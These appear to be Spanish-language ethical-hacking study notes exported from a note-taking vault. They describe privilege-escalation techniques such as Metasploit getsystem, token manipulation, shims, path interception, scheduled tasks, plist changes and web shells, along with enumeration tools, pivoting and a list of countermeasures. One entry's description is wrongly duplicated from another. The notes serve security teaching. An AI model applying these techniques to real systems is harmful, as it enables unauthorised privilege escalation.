- Los atacantes utilizan herramientas como Metasplolt para realizar una impersonación de tuberías con nombre en un host de target.ç 
- Los atacantes utilizan comandos de Metasplolt como getsystem para obtener privilegios de nivel administrativo y extraer los hashes de las contraseñas de las cuentas de administrador/usuario.

</div></div>

## ![[Unattended lnstalls \|Unattended lnstalls ]]
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Manipulación de tokens de acceso
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Aplicación Shimming
El marco de compatibilidad de aplicaciones de Windows llamado Shim se utiliza para proporcionar compatibilidad entre las versiones más antiguas y más nuevas del sistema operativo Windows Shims como RedirectEXE, injectDLL y GetProcAddress pueden ser utilizados por los atacantes para escalar privilegios, instalar puertas traseras, desactivar Windows Defender, etc.
- Debilidad de los permisos del sistema de archivos
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Interceptación de rutas
Las aplicaciones incluyen muchas debilidades y desconfiguraciones como rutas no citadas, desconfiguración de variables de entorno de la ruta y secuestro del orden de búsqueda que conducen a la interceptación de la ruta. La interceptación de rutas ayuda a un atacante a mantener la persistencia en un sistema y escalar privilegios.
- Tarea programada
El Programador de Tareas de Windows junto con utilidades como 'at' y 'schtasks' pueden ser utilizados para programar programas que pueden ser ejecutados en una fecha y hora específica. El atacante puede utilizar esta técnica para ejecutar programas maliciosos al inicio del sistema, mantener la persistencia, realizar una ejecución remota, escalar privilegios, etc.
- Lauch Deamon
Launchd se utiliza en el arranque de MacOS y OS X para completar el proceso de inicialización del sistema mediante la carga de parámetros para cada daemon de lanzamiento a nivel de sistema. Los daemons tienen plists que están vinculadas a ejecutables que se ejecutan en el arranque. El atacante puede alterar el ejecutable del daemon de lanzamiento para mantener la persistencia o para escalar privilegios.
- Plist Modification
Los archivos plist en MacOS y OS X describen cuándo deben ejecutarse los programas, la ruta del archivo ejecutable, los parámetros del programa, los permisos del sistema operativo necesarios, etc. Los atacantes alteran los archivos plist para ejecutar código malicioso en nombre de un usuario legítimo para escalar privilegios.
- Web Shell
Una shell web es un script basado en la web que permite el acceso a un servidor web. Los atacantes crean web shells para inyectar un script malicioso en un servidor web para mantener un acceso persistente y escalar privilegios.

![Pasted_image_20230909124442.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted_image_20230909124442.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### BeRoot 
es una herramienta de post-explotación para comprobar las configuraciones  rróneas más comunes para encontrar una forma de elevar los privilegios. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre los permisos de los servicios, los directorios en los que se puede escribir con sus ubicaciones, los permisos de las claves de inicio, etc.
### linpostexp
La herramienta linpostexp obtiene información detallada sobre el kernel,
que puede ser utilizada para escalar privilegios en el sistema objetivo. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre el kernel, los sistemas de archivos, el superusuario, los sudoers, la versión de sudo, etc. Los atacantes pueden utilizar esta información para explotar las vulnerabilidades presentes en el kernel para elevar sus privilegios. El siguiente comando se utiliza para extraer esta información sobre el sistema de destino: #python linprivchecker.py


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



■ Restringir los privilegios de inicio de sesión interactiva.
■ Ejecutar usuarios y aplicaciones con los privilegios más bajos.
■ Implementar la autenticación y la autorización multifactoriales.
■ Ejecutar servicios como cuentas sin privilegios.
■ Implementar una metodología de separación de privilegios para limitar el alcance de los errores y fallos de
programación.
■ Utilizar una técnica de cifrado para proteger los datos sensibles.
■ Reducir la cantidad de código que se ejecuta con un determinado privilegio.
■ Realizar la depuración utilizando comprobadores de límites y pruebas de esfuerzo.
■ Probar a fondo el sistema para detectar errores de codificación de la aplicación y bugs.
■ Parchear y actualizar periódicamente el kernel.
■ Cambiar la configuración del UAC a "Siempre notificar", de modo que aumente la visibilidad del usuario
cuando se solicite la elevación del UAC.
■ Restringir a los usuarios la escritura de archivos en las rutas de búsqueda de las aplicaciones.
■ Supervisar continuamente los permisos del sistema de archivos mediante herramientas de auditoría.
■ Reducir los privilegios de las cuentas y grupos de usuarios para que sólo los administradores legítimos
puedan realizar cambios en el servicio.
■ Utilizar herramientas de listas blancas para identificar y bloquear el software malicioso que cambia los
permisos de archivos, directorios o servicios.
■ Utilizar rutas totalmente cualificadas en todas las aplicaciones de Windows.
■ Asegúrese de que los ejecutables ali se colocan en directorios protegidos contra escritura.
■ En los sistemas operativos Mac, impida que los archivos plist sean alterados por los usuarios haciéndolos de
sólo lectura.
■ Bloquear las utilidades del sistema no deseadas o el software que pueda utilizarse para programar tareas.
■ Parchear y actualizar regularmente los servidores web.
■ Desactivar la cuenta de administrador local por defecto.
■ Detectar, reparar y solucionar cualquier fallo o error que se ejecute en los servicios del sistema.

### Defender contra el abuso de los derechos sudo:
■ Implementar una política de contraseñas fuertes para los usuarios sudo.
■ Desactivar el almacenamiento en caché de las contraseñas estableciendo el timestamp_timeout en O, de
modo que cada vez que se ejecute sudo los usuarios deban introducir su contraseña.
■ Separar las cuentas administrativas de nivel sudo de las cuentas regulares del administrador, para evitar el
robo de contraseñas sensibles.
■ Actualizar los permisos y las cuentas de los usuarios a intervalos regulares.
■ Probar los usuarios sudo con acceso a programas que contengan parámetros para la ejecución de código
arbitrario.

</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
- Los atacantes utilizan la técnica de retransmisión para acceder a recursos presentes en otros sistemas a través del sistema comprometido, de forma que las solicitudes de acceso a los recursos procedan del sistema inicialmente comprometido.
![Pasted image 20230909122521.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909122521.png)

![Pasted image 20230909123601.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123601.png)

![Pasted image 20230909123728.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123728.png)



</div></div>
